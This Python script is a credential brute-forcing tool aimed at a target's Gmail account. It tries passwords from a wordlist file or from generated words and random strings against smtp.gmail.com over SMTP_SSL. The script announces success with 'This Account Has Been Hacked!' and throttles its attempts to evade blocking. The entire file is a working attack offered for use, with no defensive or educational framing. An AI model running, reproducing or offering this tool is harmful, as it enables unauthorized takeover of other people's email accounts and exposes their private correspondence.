import smtplib
import ssl
import random
import time
import nltk
import string  # Add string module import

# Initialize NLTK words corpus
nltk.download('words')
english_words = set(word.lower() for word in nltk.corpus.words.words())

# Global set to keep track of used passwords
used_passwords = set()

def main():
    target_email = input('Enter target email: ')
    option = input('Select password generation method:\n'
                   '[1] Password list file\n'
                   '[2] Password generator\n'
                   'Enter your choice: ')
    
    if option == '1':
        file_path = input('Enter the path of passwords file: ')
        pass_list = load_passwords(file_path)
    elif option == '2':
        min_length = int(input('Enter the minimum length of passwords: '))
        max_length = int(input('Enter the maximum length of passwords: '))
        pass_list = generate_passwords(min_length, max_length)
    else:
        print('Invalid option. Exiting program.')
        return

    if pass_list:
        brute_force_attack(target_email, pass_list)
    else:
        print("Exiting program.")

def load_passwords(file_path):
    try:
        with open(file_path, 'r') as pass_file:
            return [password.strip() for password in pass_file.readlines()]
    except FileNotFoundError:
        print("Error: Passwords file not found.")
        return []

def generate_common_password():
    """Generate a common password from English words or phrases"""
    while True:
        word = random.choice(list(english_words))
        # Ensure the password is unique
        if word not in used_passwords:
            used_passwords.add(word)
            return word

def generate_strong_password(min_length, max_length):
    """Generate a strong password with a mix of characters"""
    chars = string.ascii_letters + string.digits + string.punctuation
    length = random.randint(min_length, max_length)
    return ''.join(random.choices(chars, k=length))

def generate_passwords(min_length, max_length):
    """Generate passwords alternating between common and strong passwords"""
    while True:
        yield generate_common_password()
        yield generate_strong_password(min_length, max_length)

def brute_force_attack(target_email, pass_generator):
    # Configure SSL context
    context = ssl.create_default_context()

    # Define a function for login attempt
    def login_attempt(password):
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
                server.login(target_email, password)
                return password
        except smtplib.SMTPAuthenticationError:
            return None
        except Exception as e:
            print(f'An error occurred while connecting to the SMTP server: {e}')
            return None

    # Perform brute-force attack
    for password in pass_generator:
        print(f'Trying password: {password}')
        result = login_attempt(password)
        if result:
            print('[+] This Account Has Been Hacked! Password:', password)
            return
        else:
            print('[!] Password not found =>', password)
            # Wait before trying the next password to avoid being blocked
            time.sleep(2)

if __name__ == "__main__":
    main()
